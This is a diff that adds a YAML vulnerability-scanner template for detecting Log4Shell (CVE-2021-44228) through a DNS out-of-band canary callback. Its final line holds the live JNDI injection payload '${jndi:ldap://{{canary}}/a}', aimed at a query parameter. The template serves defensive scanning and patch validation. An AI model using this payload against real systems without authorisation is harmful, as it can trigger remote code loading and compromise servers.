@@ -1,0 +1,26 @@
+schema_version: rce-finder/v2
+id: java-jndi-logging-safe-oob
+name: Java logging/JNDI safe callback validation
+severity: critical
+vuln_class: jndi-injection
+cwe: ["CWE-74", "CWE-917"]
+cve: ["CVE-2021-44228"]
+technologies: ["java", "jvm", "logging"]
+prerequisites:
+  required_technologies: ["java"]
+  minimum_fingerprint_confidence: 30
+  allowed_methods: ["GET"]
+  allowed_content_types: ["application/x-www-form-urlencoded"]
+  required_mode: safe-validation
+mode: safe-validation
+confidence_requirements: ["exact probe ID and DNS protocol OOB match"]
+remediation: "Upgrade affected Java logging dependencies and follow the vendor mitigation guidance. Validate patches with a negative fixture."
+references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
+oob_protocol: dns
+method: GET
+path: ""
+timeout_seconds: 3
+injection_points:
+  - location: query
+    name: q
+payload: "${jndi:ldap://{{canary}}/a}"
